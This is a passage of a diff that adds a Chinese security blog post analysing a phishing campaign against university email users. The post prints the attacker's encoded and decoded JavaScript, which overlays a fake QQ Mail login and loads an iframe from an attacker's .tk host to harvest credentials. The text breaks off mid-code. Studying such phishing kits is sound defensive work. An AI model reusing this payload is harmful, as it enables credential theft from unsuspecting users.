@@ -258,6 +258,266 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/21/分析并复现一次iframe框架钓鱼行为/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/05/21/分析并复现一次iframe框架钓鱼行为/" itemprop="url">
+                  分析并复现一次iframe框架钓鱼行为
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-21T20:55:29+08:00">
+                2018-05-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/05/21/分析并复现一次iframe框架钓鱼行为/" class="leancloud_visitors" data-flag-title="分析并复现一次iframe框架钓鱼行为">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>事情的起因是这样的，这几天正在玩手机的时候忽然收到一封邮件名是校园通知发件人是西安电子科技大学的邮件，然后顺手打开邮箱一看， <a href="http://mrw.so/" target="_blank" rel="noopener">http://mrw.so/</a> 的短链接，邮箱是一串随便注册的前缀，是钓鱼邮件没错了。看到同时抄送了那么多人，应该是在哪里注册后公开的邮箱和学校信息被人爬去批量发邮件钓鱼了。不过既然碰到了钓鱼，点开分析一下肯定是要做的。</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing01.png" alt=""></p>
+<h2 id="0x01-尝试"><a href="#0x01-尝试" class="headerlink" title="0x01 尝试"></a>0x01 尝试</h2><p>点击短链接跳转到了 <a href="http://www.topaone.com/JPadmin/images/login/ucds/dsif/fysh/g7ues/fsr3/kyuwr1.htm?xmk/youx1?id=qyshz107&amp;/OdJb" target="_blank" rel="noopener">http://www.topaone.com/JPadmin/images/login/ucds/dsif/fysh/g7ues/fsr3/kyuwr1.htm?xmk/youx1?id=qyshz107&amp;/OdJb</a><br> 并且在加载出来之前一直显示一个很刻意的“链接中”，并且url有好长的路径，看样子像是哪个公司的服务器被钓鱼作者放了点东西，直接访问了下 <a href="http://www.topaone.com" target="_blank" rel="noopener">http://www.topaone.com</a> 发现果然是一个叫京品设计的公司。</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing02.png" alt=""></p>
+<p>加载出来之后是一个qq邮箱的登陆解面，不过做的很不走心，网页title都没写qq邮箱，title旁边的ico也是qq空间而不是qq邮箱的ico，登陆框除了账号密码两个输入框和登陆按钮以外都是不可点击状态。随便填一个账号密码弹窗提示密码错误，而且返回信息的网址应该是钓鱼作者的服务器。</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing03.png" alt=""></p>
+<p>还有一点是在进入这个链接的时候，即使已经到了邮箱登陆页面，浏览器仍然一直处于加载状态，以之前自己写钓鱼网站的经验来猜测，对方应该使用了window.onload配合document.write来覆盖整个页面，所以每次加载完都会重触发一次window.onload，无限循环。</p>
+<h2 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h2><p>见识了一下大致的访问过程，该抓包看看具体是怎么个流程了，在burpsuite中截取数据包，发现访问到的页面返回了一堆编码过的js代码。</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing04.png" alt=""></p>
+<p>初步判断这个钓鱼作者在京品设计公司的服务器上面挂了一个存储型xss。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">&lt;!--</span></span><br><span class="line"><span class="undefined">document.write(unescape("%3Cscript%3E%0D%0A%3C%21--%0D%0Adocument.write%28unescape%28%22%253C%2521--%2523Include%2520File%253D%2522SqlIn.Asp%2522--%253E%250D%250A%253Chtml%253E%250D%250A%253Chead%253E%250D%250A%253Cmeta%2520http-equiv%253D%2522Content-Language%2522%2520content%253D%2522zh-cn%2522%253E%250D%250A%253Cmeta%2520HTTP-EQUIV%253D%2522Content-Type%2522%2520CONTENT%253D%2522text/html%253B%2520charset%253Dgb2312%2522%253E%250D%250A%253Ctitle%253Eukkifddssfggg---kuasa......%253C/title%253E%250D%250A%253Cmeta%2520name%253D%2522description%2522%2520content%253D%2522%2522%253E%250D%250A%253Clink%2520href%253D%2522index_files/88.css%253Fmax_age%253D31536000%2526d%253D1333188324128%2522%2520rel%253D%2522stylesheet%2522%2520type%253D%2522text/css%2522%253E%253Clink%2520href%253D%2522index_files/home_fixed.css%253Fmax_age%253D31536000%2526d%253D1334659684120%2522%2520rel%253D%2522stylesheet%2522%2520type%253D%2522text/css%2522%253E%250D%250A%250D%250A%253C%2521--%255Bif%2520%2521%2528IE%2529%255D%253E%253C%2521--%253E%253C%2521--%253Cbase%2520href%253D%2522%2522%253E--%253E%253Cbase%2520href%253D%2522.%2522%253E%253C%2521--%253C%2521%255Bendif%255D--%253E%250D%250A%253C%2521--%255Bif%2520%2521%2528IE%2529%255D%253E%253C%2521--%253E%253C%2521--%253Cbase%2520href%253D%2522%2522%253E--%253E%253Cbase%2520href%253D%2522.%2522%253E%253C%2521--%253C%2521%255Bendif%255D--%253E%250D%250A%250D%250A%253Cstyle%2520id%253D%2522mainJSBg%2522%2520type%253D%2522text/css%2522%253E%250D%250A.lay_background%257Bbackground-repeat%253Ano-repeat%253Bbackground-position%253Acenter%2520top%253Bbackground-attachment%253Ascroll%253Bbackground-image%253Aurl%252864538_top.jpg%2529%253B%257D%250D%250Abody%257Bbackground-image%253Aurl%252864538_bg.jpg%2529%253B%2520background-repeat%253Arepeat%253B%257D%253C/style%253E%250D%250A%250D%250A%250D%250A%253Cstyle%2520type%253D%2522text/css%2522%2520id%253D%2522dynamicStyle%2522%253E%250D%250A.ownermode%257Bdisplay%253Anone%253B%257D%250D%250A.clientmode%257Bdisplay%253A%253B%257D%250D%250A.editmode%257Bdisplay%253Anone%253B%257D%250D%250A.customoff%257Bdisplay%253A%253B%257D%250D%250A.alphamode%257Bdisplay%253Anone%253B%257D%250D%250A%253C/style%253E%250D%250A%250D%250A%250D%250A%250D%250A%250D%250A%250D%250A%253C/style%253E%250D%250A%253Clink%2520rel%253D%2522Shortcut%2520Icon%2522%2520href%253D%2522http%253A//ctc.qzonestyle.gtimg.cn/qzonestyle/qzone_client_v5/img/favicon.ico%2522%2520type%253D%2522image/x-icon%2522%253E%250D%250A%253C/head%253E%250D%250A%253Cbody%2520id%253D%2522QZ_Body%2522%2520class%253D%2522bg_body%2520%2520%2522%253E%250D%250A%250D%250A%253Cdiv%2520id%253D%2522welcomeflash%2522%2520style%253D%2522position%253Afixed%253B_position%253Aabsolute%253Btop%253A0%253Bleft%253A0%253Bbackground-color%253Awhite%253Btext-align%253Acenter%253Bwidth%253A100%2525%253Bz-index%253A30000%253Bheight%253A10000px%253B%2522%2520onClick%253D%2522wSwf_obj_swf.call%2528this%2529%2522%253E%253Cdiv%2520style%253D%2522width%253A100%2525%253Bposition%253Aabsolute%253Bleft%253A0%253Btop%253A0%253Bbackground%253Awhite%253Bheight%253A100%2525%253B%2522%253E%250D%250A%250D%250A%253C%25u94FE%25u63A5%25u4E2D%25B7%25B7%25B7%25B7%25B7%253E%250D%250A%250D%250A%253C/div%253E%253Cdiv%2520style%253D%2522width%253A100%2525%253Bcursor%253Apointer%253Bposition%253Aabsolute%253Bleft%253A0px%253Bbackground%253Aurl%2528about%253Ablank%2529%253Bopacity%253A0%253Bz-index%253A30001%253Btop%253A0px%253Bheight%253A100%2525%2522%253E%253C/div%253E%253C/div%253E%250D%250A%253Cscript%2520type%253D%2522text/javascript%2522%253E%250D%250A%2528function%2528%2529%2520%257B%250D%250A%2509var%2520wel%253Ddocument.getElementById%2528%2527welcomeflash%2527%2529%252Ctimer%252Cch%252C_s%253Dnew%2520Function%253B%250D%250A%2509window.wSwf_obj_swf%2520%253D%2520window.wSwf_obj_swf_s%253Dfunction%2528%2529%2520%257B%250D%250A%2509%2509document.documentElement.style.overflow%2520%253D%2520%2522%2522%253B%250D%250A%2509%2509wel%2520%2526%2526%2520%2528wel.innerHTML%2520%253D%2520%2527%2527%2529%253B%250D%250A%2509%2509wel%2520%2526%2526%2520document.body.removeChild%2528wel%2529%253B%250D%250A%2509%2509window.removeEventListener%253Fwindow.removeEventListener%2528%2527resize%2527%252C_s%2529%253A%2528window.detachEvent%2526%2526window.detachEvent%2528%2527onresize%2527%252C_s%2529%2529%253B%250D%250A%2509%2509clearTimeout%2528timer%2529%253B%250D%250A%2509%257D%253B%250D%250A%2509timer%2520%253D%2520setTimeout%2528wSwf_obj_swf%252C%25204000%2529%253B%250D%250A%2509if%2520%2528wel%2529%2520%257B%250D%250A%2509%2509_s%253Dfunction%2528%2529%257B%250D%250A%2509%2509%2509ch%253Ddocument.documentElement.clientHeight%253B%250D%250A%2509%2509%2509wel.children%255B0%255D.style.paddingTop%2520%253D%2520Math.floor%2528Math.max%25280%252Cch%2520-%2520590%2529%2520/%25202%2529+%2527px%2527%253B%250D%250A%2509%2509%257D%253B%250D%250A%250D%250A%2509%2509document.documentElement.style.overflow%2520%253D%2520%2522hidden%2522%253B%250D%250A%2509%2509_s%2528%2529%253B%250D%250A%2509%2509window.addEventListener%253Fwindow.addEventListener%2528%2527resize%2527%252C_s%252Cfalse%2529%253A%2528window.attachEvent%2526%2526window.attachEvent%2528%2527onresize%2527%252C_s%2529%2529%253B%250D%250A%2509%257D%250D%250A%257D%2529%2528%2529%253B%250D%250A%253C/script%253E%250D%250A%250D%250A%250D%250A%250D%250A%250D%250A%250D%250A%253Cstyle%253Ehtml%257Boverflow%253Ahidden%253B%257Dbody%257Bheight%253A100%2525%253Bmargin%253A0px%253B%257D%253C/style%253E%253C/head%253E%253Cbody%2520scroll%253D%2522no%2522%253E%250D%250A%253Ciframe%2520id%253D%2522iframe%2522%2520%2520%2520height%253D%2522100%2525%2522%2520width%253D%2522100%2525%2522%2520%2520frameborder%253D%25220%2522%253E%253C/iframe%253E%250D%250A%2520%2520%253Cscript%2520%2520%2520language%253D%2522javascript%2522%253E%2520%2520%2520%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520var%2520pos%252Cstr%252Cpara%252Curl%253B%2520%2520%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520str%2520%253D%2520window.location.href%253B%2520%2520%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520pos%2520%253D%2520str.indexOf%2528%2522%253F%2522%2529%2520%2520%253B%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520url%2520%253D%2520str.substring%2528pos+1%2529%253B%2520%2520%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520if%2520%2528pos%253E0%2529%257B%2520%2520%250D%250A%2509%2509%2509%2509n%253D%2527http%253A//ujhgdgjalkfja2.tk/%2527%253B%250D%250A%2509%2509%2509%2509j1%253Dn+url%253B%250D%250A%2509%2509%2509%2509c%253D%2527%253Clink%2520rel%253D%2522shortcut%2520icon%2522%2520href%253D%2522https%253A//s.tbcdn.cn/apps/login/static/img/favicon.ico%2522%2520type%253D%2522image/x-icon%2522%2520/%253E%2527%253B%250D%250A%2509%2509%2509%2509b%253D%2527%253Chtml%253E%253Chead%253E%253Cstyle%253Ehtml%257Boverflow%253Ahidden%253B%257Dbody%257Bheight%253A100%2525%253Bmargin%253A0px%253B%257D%253C/style%253E%253C/head%253E%253Cbody%2520scroll%253D%2522no%2522%253E%2527%253B%250D%250A%2509%2509%2509%2509a%253D%2527%253Ciframe%2520name%253D%2522main%2522%2520%2520height%253D%2522100%2525%2522%2520src%253D%2522%2527%253B%250D%250A%2509%2509%2509%2509k1%253D%2527%2522%2520width%253D%2522101%2525%2522%2520%2520frameborder%253D%25220%2522%253E%253C/iframe%253E%2527%253B%250D%250A%2520%2509%2509%2509%2509var%2520%2520d%2520%253D%2520%2520window.frames%255B0%255D%253B%250D%250A%2520%2520%2509%2509%2509%2509d.document.write%2528c+b+a+j1+k1%2529%253B%2520%2520%2520%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%257D%2520%2520%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520else%2520%2520%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%257B%2520%2520%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%257D%2520%2520%250D%250A%2520%2520%253C/script%253E%250D%250A%2520%2520%250D%250A%250D%250A%253Chead%253E%22%29%29%3B%0D%0A//--%3E%0D%0A%3C/script%3E"));</span></span><br><span class="line"><span class="undefined">//--&gt;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这个钓鱼网站作者没有对代码做什么加密，明显只是多次编码过的js代码，直接url解码两次，得到清晰的js代码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">&lt;!--</span></span><br><span class="line"><span class="xml">document.write(unescape("<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span></span><br><span class="line"><span class="undefined">&lt;!--</span></span><br><span class="line"><span class="xml">document.write(unescape("<span class="comment">&lt;!--#Include File="SqlIn.Asp"--&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Language"</span> <span class="attr">content</span>=<span class="string">"zh-cn"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">"Content-Type"</span> <span class="attr">CONTENT</span>=<span class="string">"text/html; charset=gb2312"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>ukkifddssfggg---kuasa......<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"description"</span> <span class="attr">content</span>=<span class="string">""</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"index_files/88.css?max_age=31536000&amp;d=1333188324128"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"index_files/home_fixed.css?max_age=31536000&amp;d=1334659684120"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!--[if !(IE)]&gt;&lt;!--&gt;</span><span class="comment">&lt;!--&lt;base href=""&gt;--&gt;</span><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">"."</span>&gt;</span><span class="comment">&lt;!--&lt;![endif]--&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!--[if !(IE)]&gt;&lt;!--&gt;</span><span class="comment">&lt;!--&lt;base href=""&gt;--&gt;</span><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">"."</span>&gt;</span><span class="comment">&lt;!--&lt;![endif]--&gt;</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">style</span> <span class="attr">id</span>=<span class="string">"mainJSBg"</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="undefined"></span></span></span><br><span class="line"><span class="undefined">.lay_background&#123;background-repeat:no-repeat;background-position:center top;background-attachment:scroll;background-image:url(64538_top.jpg);&#125;</span></span><br><span class="line"><span class="xml">body&#123;background-image:url(64538_bg.jpg); background-repeat:repeat;&#125;<span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">id</span>=<span class="string">"dynamicStyle"</span>&gt;</span><span class="undefined"></span></span></span><br><span class="line"><span class="undefined">.ownermode&#123;display:none;&#125;</span></span><br><span class="line"><span class="undefined">.clientmode&#123;display:;&#125;</span></span><br><span class="line"><span class="undefined">.editmode&#123;display:none;&#125;</span></span><br><span class="line"><span class="undefined">.customoff&#123;display:;&#125;</span></span><br><span class="line"><span class="undefined">.alphamode&#123;display:none;&#125;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"Shortcut Icon"</span> <span class="attr">href</span>=<span class="string">"http://ctc.qzonestyle.gtimg.cn/qzonestyle/qzone_client_v5/img/favicon.ico"</span> <span class="attr">type</span>=<span class="string">"image/x-icon"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span> <span class="attr">id</span>=<span class="string">"QZ_Body"</span> <span class="attr">class</span>=<span class="string">"bg_body  "</span>&gt;</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"welcomeflash"</span> <span class="attr">style</span>=<span class="string">"position:fixed;_position:absolute;top:0;left:0;background-color:white;text-align:center;width:100%;z-index:30000;height:10000px;"</span> <span class="attr">onClick</span>=<span class="string">"wSwf_obj_swf.call(this)"</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"width:100%;position:absolute;left:0;top:0;background:white;height:100%;"</span>&gt;</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">链接中?????</span>&gt;</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"width:100%;cursor:pointer;position:absolute;left:0px;background:url(about:blank);opacity:0;z-index:30001;top:0px;height:100%"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span></span><br><span class="line"><span class="undefined">(function() &#123;</span></span><br><span class="line"><span class="undefined">	var wel=document.getElementById('welcomeflash'),timer,ch,_s=new Function;</span></span><br><span class="line"><span class="undefined">	window.wSwf_obj_swf = window.wSwf_obj_swf_s=function() &#123;</span></span><br><span class="line"><span class="undefined">		document.documentElement.style.overflow = "";</span></span><br><span class="line"><span class="undefined">		wel &amp;&amp; (wel.innerHTML = '');</span></span><br><span class="line"><span class="undefined">		wel &amp;&amp; document.body.removeChild(wel);</span></span><br><span class="line"><span class="undefined">		window.removeEventListener?window.removeEventListener('resize',_s):(window.detachEvent&amp;&amp;window.detachEvent('onresize',_s));</span></span><br><span class="line"><span class="undefined">		clearTimeout(timer);</span></span><br><span class="line"><span class="undefined">	&#125;;</span></span><br><span class="line"><span class="undefined">	timer = setTimeout(wSwf_obj_swf, 4000);</span></span><br><span class="line"><span class="undefined">	if (wel) &#123;</span></span><br><span class="line"><span class="undefined">		_s=function()&#123;</span></span><br><span class="line"><span class="undefined">			ch=document.documentElement.clientHeight;</span></span><br><span class="line"><span class="undefined">			wel.children[0].style.paddingTop = Math.floor(Math.max(0,ch - 590) / 2) 'px';</span></span><br><span class="line"><span class="undefined">		&#125;;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">		document.documentElement.style.overflow = "hidden";</span></span><br><span class="line"><span class="undefined">		_s();</span></span><br><span class="line"><span class="undefined">		window.addEventListener?window.addEventListener('resize',_s,false):(window.attachEvent&amp;&amp;window.attachEvent('onresize',_s));</span></span><br><span class="line"><span class="undefined">	&#125;</span></span><br><span class="line"><span class="undefined">&#125;)();</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined">html&#123;overflow:hidden;&#125;body&#123;height:100%;margin:0px;&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span> <span class="attr">scroll</span>=<span class="string">"no"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">"iframe"</span>   <span class="attr">height</span>=<span class="string">"100%"</span> <span class="attr">width</span>=<span class="string">"100%"</span>  <span class="attr">frameborder</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>   <span class="attr">language</span>=<span class="string">"javascript"</span>&gt;</span><span class="undefined">   </span></span><br><span class="line"><span class="undefined">               var pos,str,para,url;  </span></span><br><span class="line"><span class="undefined">                str = window.location.href;  </span></span><br><span class="line"><span class="undefined">                pos = str.indexOf("?")  ;</span></span><br><span class="line"><span class="undefined">                url = str.substring(pos 1);  </span></span><br><span class="line"><span class="undefined">                if (pos&gt;0)&#123;  </span></span><br><span class="line"><span class="undefined">				n='http://ujhgdgjalkfja2.tk/';</span></span><br><span class="line"><span class="undefined">				j1=n url;</span></span><br><span class="line"><span class="xml">				c='<span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"shortcut icon"</span> <span class="attr">href</span>=<span class="string">"https://s.tbcdn.cn/apps/login/static/img/favicon.ico"</span> <span class="attr">type</span>=<span class="string">"image/x-icon"</span> /&gt;</span>';</span></span><br><span class="line"><span class="xml">				b='<span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined">html&#123;overflow:hidden;&#125;body&#123;height:100%;margin:0px;&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span> <span class="attr">scroll</span>=<span class="string">"no"</span>&gt;</span>';</span></span><br><span class="line"><span class="xml">				a='<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">"main"</span>  <span class="attr">height</span>=<span class="string">"100%"</span> <span class="attr">src</span>=<span class="string">"';</span></span></span></span><br><span class="line"><span class="xml">				k1='" width="101%"  frameborder="0"&gt;<span class="tag">&lt;/<span class="name">iframe</span>&gt;</span>';</span></span><br><span class="line"><span class="undefined"> 				var  d =  window.frames[0];</span></span><br><span class="line"><span class="undefined">  				d.document.write(c b a j1 k1);   </span></span><br><span class="line"><span class="undefined">                &#125;  </span></span><br><span class="line"><span class="undefined">                else  </span></span><br><span class="line"><span class="undefined">                &#123;  </span></span><br><span class="line"><span class="undefined">                &#125;  </span></span><br><span class="line"><span class="undefined">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>"));</span><br><span class="line">//--&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span>"));</span><br><span class="line">//--&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>我们解码出完整代码就可以看到，他使用javascript的document.write方法，动态写入html页面覆盖整个文档，因为这么大量的js动态写入会非常慢，所以他在页面没有加载完之前，使用了“加载中”来掩盖这个网站原有的内容。</p>
+<p>他前面大部分代码应该是从别人钓鱼qq空间用的代码中提取出来的，所以那部分css和js有很多不合理的地方，而且整个页面背景与登陆框都是调用他自己服务器保存好的截图，不是用html和css写出来的，导致不能完整的模仿出qq邮箱的一些样式，欺骗性大大降低。</p>
+<p>最后的部分也就是他真正用来盗取账号密码的部分，攻击者远程调用了一个iframe框架,使用js依次将写好的变量c b a j1 k1的内容动态写入当前页面</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">"iframe"</span>   <span class="attr">height</span>=<span class="string">"100%"</span> <span class="attr">width</span>=<span class="string">"100%"</span>  <span class="attr">frameborder</span>=<span class="string">"0"</span>&gt;</span><span 